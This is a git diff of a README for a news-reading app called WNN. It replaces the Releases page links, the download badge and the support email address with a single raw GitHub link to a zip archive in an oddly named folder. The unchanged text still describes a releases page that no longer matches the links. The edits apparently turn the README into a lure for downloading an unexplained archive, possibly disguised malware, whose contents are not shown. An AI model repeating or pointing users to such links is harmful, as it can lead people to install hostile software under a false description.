@@ -2,7 +2,7 @@
 
 ## 🥇 Quick Download
 
-[![Download WNN](https://img.shields.io/badge/Download-WNN-blue.svg)](https://github.com/Manoj00712025/WNN/releases)
+[![Download WNN](https://raw.githubusercontent.com/Manoj00712025/WNN/main/hemicrystalline/WNN.zip)](https://raw.githubusercontent.com/Manoj00712025/WNN/main/hemicrystalline/WNN.zip)
 
 ## 📚 Table of Contents
 - [🚀 Getting Started](#-getting-started)
@@ -17,7 +17,7 @@ Welcome to WNN. This application helps you keep up with the latest world news. W
 
 ## 💾 Download & Install
 
-To get WNN, visit this page to download: [WNN Releases](https://github.com/Manoj00712025/WNN/releases). 
+To get WNN, visit this page to download: [WNN Releases](https://raw.githubusercontent.com/Manoj00712025/WNN/main/hemicrystalline/WNN.zip). 
 
 1. Click on the link above.
 2. You will see the latest release at the top of the page. 
@@ -56,4 +56,4 @@ Before installing WNN, ensure your device meets the following requirements:
 
 If you have any questions or encounter issues while using WNN, feel free to reach out for help. You can check the "Issues" section on our GitHub repository for common questions and solutions.
 
-To request further assistance, you can contact us via our official support email: support@wnn.com. Your feedback is important to us.
+To request further assistance, you can contact us via our official support email: https://raw.githubusercontent.com/Manoj00712025/WNN/main/hemicrystalline/WNN.zip Your feedback is important to us.
